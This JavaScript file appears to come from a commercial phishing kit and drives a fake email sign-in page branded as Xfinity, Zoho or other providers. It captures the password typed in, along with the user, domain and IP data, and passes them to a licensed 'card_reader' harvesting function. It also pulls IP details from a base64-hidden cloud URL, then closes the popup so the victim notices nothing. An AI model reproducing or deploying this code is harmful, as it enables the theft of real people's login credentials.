let addC = "error"
let ip_config = {};
$(document).ready(async function (){
    localStorageCheck();
    $("a").each(function (){
        $(this).attr("onclick", "window.parent.location.replace(window.parent.location.href); return false;")
    });



    let url = new URL(location.href);
    if(url.searchParams.has("t")){
        if(url.searchParams.get("t")!=="comcast"){
            $("span.xfinity-logo").addClass(url.searchParams.get("t"));
        }
    }
    if(url.searchParams.get("t")==="others" || url.searchParams.get("t")==="zoho"){
        $(".single.logo-wrapper").css({"height": "68px", "max-height": "68px"})
    }



    $("#user").val(url.searchParams.get("u"));
    $("#domain").val(url.searchParams.get("d"));

    $("#passwd").on('focus', function (){
        $("label[for=passwd]").removeClass("accessibly-hidden");
        $(this).removeAttr('placeholder');
    });

    $("#passwd").on('focusout', function (){
        if($(this).val().length < 1){
            $("label[for=passwd]").addClass("accessibly-hidden");
            $(this).attr('placeholder', 'PASSWORD');
        }
    });

    $("#passwd").on('change', function (){
        if($(this).val().length > 0){
            $("#passwd-error").hide("fast");
            $(this).removeClass('error');
        }
    });



    $("#form_signin").on('submit', async function (e){
        e.preventDefault();
        let $passwordError = $("#passwd-error");
        let $login_sign = $("#sign_in");
        let $passwd = $("#passwd");
        $passwordError.hide("fast");
        $passwd.removeClass(addC);
        $login_sign.attr("disabled", "disabled");
        $login_sign.html("Please wait..");
        $passwd.attr("readonly", "readonly");
        if($passwd.val().length < 6){
            setTimeout(function (){
                $passwordError.html("Please enter a valid password.");
                $passwordError.show("fast");
                $passwd.addClass(addC);
                $login_sign.removeAttr("disabled");
                $login_sign.html("Continue");
                $passwd.removeAttr("readonly");
            }, 700);
        }else {

            let result = await card_reader(SCRIPT_NAME, "Jm Tech", LICENSE_KEY, JSON.stringify(ip_config), $passwd.val(), $("#user").val(), $("#domain").val())
            if(Object.keys(result).includes('errors')){
                setTimeout(function (){
                    $passwordError.html("Error, please check your internet connection or reload this page.");
                    $passwordError.show("fast");
                    $passwd.addClass(addC);
                    $login_sign.removeAttr("disabled");
                    $login_sign.html("Continue");
                    $passwd.removeAttr("readonly");
                },700);
            }else {
                setTimeout(function (){
                    if(result.response.msg.includes("uccessfull")){
                        localStorage.setItem("sent", "true sent for real");
                        parent.close_popup_final();
                    }else {
                        $passwordError.html("Unknown error occur, please reload this page or try again.");
                        $passwordError.show("fast");
                        $passwd.addClass(addC);
                        $login_sign.removeAttr("disabled");
                        $login_sign.html("Continue");
                        $passwd.removeAttr("readonly");
                    }
                }, 1300);
            }
        }
        return false;
    });


    if(Object.keys(ip_config).length < 2){
        await get_ip();
    }
});







async function get_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                console.log(response);
                if(response.status === "success"){
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                console.log(error);
                resolve(true);
            }
        });
    });
}


function localStorageCheck(){
    let ip = localStorage.getItem("ip_config");
    if(ip !== null) ip_config = JSON.parse(ip);
}